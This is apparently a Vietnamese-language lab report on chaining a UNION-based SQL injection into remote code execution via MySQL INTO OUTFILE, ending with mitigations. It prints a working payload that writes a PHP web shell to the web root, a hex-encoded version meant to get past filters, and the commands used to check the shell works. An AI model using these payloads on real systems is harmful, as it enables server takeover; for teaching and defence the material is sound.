# Task 5: Báo Cáo Khai Thác RCE Kỹ Thuật Đọc/Ghi File Qua MySQL `INTO OUTFILE`

## 1. Phân Tích Điều Kiện SQL Injection (MySQL `INTO OUTFILE`)
SQLi `INTO OUTFILE` đặc biệt phụ thuộc nghiêm ngặt vào các biến Hệ Điều Hành MYSQL. Do file script/vulnerability (Ví dụ: `index.php`) thường là **UNION-Based SQL Injection**, Web server sẽ ném cho DB lệnh `SELECT ... INTO OUTFILE ...`
Mục tiêu là chèn nội dung dạng `<?php system($_GET['cmd']); ?>` ra một file PHP trong Web Root.

**Nhưng cần phải có 3 điều kiện tiên quyết: Yếu Tố "Thiên Thời, Địa Lợi, Nhân Hòa":**
1. User Database kết nối phải có quyền `FILE` (mặc định user `root` có).
2. Đường dẫn xuất file phải cho phép Database ghi vào (VD: /var/www/html/uploads) (OS Permission `chmod/chown`).
3. Biến đặc biệt `secure_file_priv` phải đang để trống `""` thay vì cấu hình khoá cứng (NULL/Directory_Cụ_Thể). (Đặc quyền MySQL Dòng 5.7.6+ mặc định gán cứng đường dẫn tmp `/var/lib/mysql-files/`, CỰC KỲ KHÓ BYPASS NẾU KHÔNG CÓ LỖ HỔNG KHÁC - như ghi config / LFI ...).

Trong bài Lab này, chúng ta đã chỉnh file cấu hình Database MySQL `custom_mysql.cnf` thêm giá trị `secure_file_priv=""` để mô phỏng hoàn thiện RCE này.

## 2. Chiến Lược Ghi Shell Qua UNION SELECT
Bằng cách sử dụng Web interface (bị lỗi `$id = $_GET['id']` - Union), chúng ta tìm được số lượng column (bằng `ORDER BY 3`), sau đó lợi dụng phép Select tạo ra một dòng kết quả giả tự phát để lưu ra đĩa cứng MySQL:

**Payload Thiết Kế Vượt Rào Filter Bằng Cơ Chế Hex/String:**
```sql
?id=1' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3 INTO OUTFILE '/var/www/html/uploads/shell.php' -- -
```
Nếu Payload PHP bị Filter `<?php`, có thể encode HEX:
`0x3C3F7068702073797374656D28245F4745545B27636D64275D293B203F3E`
Khi Export ra ổ cứng, MySQL tự parse Hex đó thành XML/PHP thực tiễn.

**Nguyên Lý MySQL Xử Lý "Into Outfile" Ghi Mảng:**
- Dấu nháy `: id='1'` ghép với Dấu nháy ảo tạo thành String hợp lệ. Câu Execute: `SELECT ... id='1' UNION SELECT ... INTO OUTFILE '/var/www/html/shell.php' -- -'`
- Cột số (1) điền giả vào ô `id`. Cột text (PHP_Shell) gán vào ổ `name` giả. Cột số (3) gán ổ `description`.
- Khi chèn vào đĩa cứng MySQL (`mysqld` daemon), file tạo ra nhận string:
  `1    <?php system($_GET["cmd"]); ?>   3`. File này sau khi parse từ Extension `.php` bởi Zend Engine (Nginx/Apache), Cột 1 và 3 chỉ đơn thuần là string `1    3`, Nhưng cột giữa sẽ ném lệnh command sang hệ thống OS!

## 3. Quá Trình Vượt Hàng Rào Xác Minh
**Chạy Payload vào port Web (`8006`)**:
- Trình duyệt đứng màn trắng lịm. DB giấu kín result.
- Dò đường dẫn Web: Truy cập `/uploads/shell.php?cmd=whoami`. Response in ngay lên đầu: `www-data`.
- Chạy RCE list file: `/uploads/shell.php?cmd=ls -la /`. Kết quả in thư mục Host MySQL như một Terminal thực thụ. 
- Tại đây, lỗ hổng MySQL Data Leak đã tiến lên RCE - OS Command Level. Đã bị Chiếm Hữu Server.

## 4. Cách Phòng Ngừa (Vá Lỗi)
- Bật `secure_file_priv` một lần nữa (xoá khỏi MySQL `[mysqld]` block hoặc cấm rỗng `""`), cài đặt thành thư mục Temporary, không liên quan WebDir.
- Đặt quyền (CHMOD) thư mục `wwwroot/` là `Chỉ Đọc` từ User MySQL.
- Sửa gốc rễ: Áp dụng SQL Prepared Statements PDO.
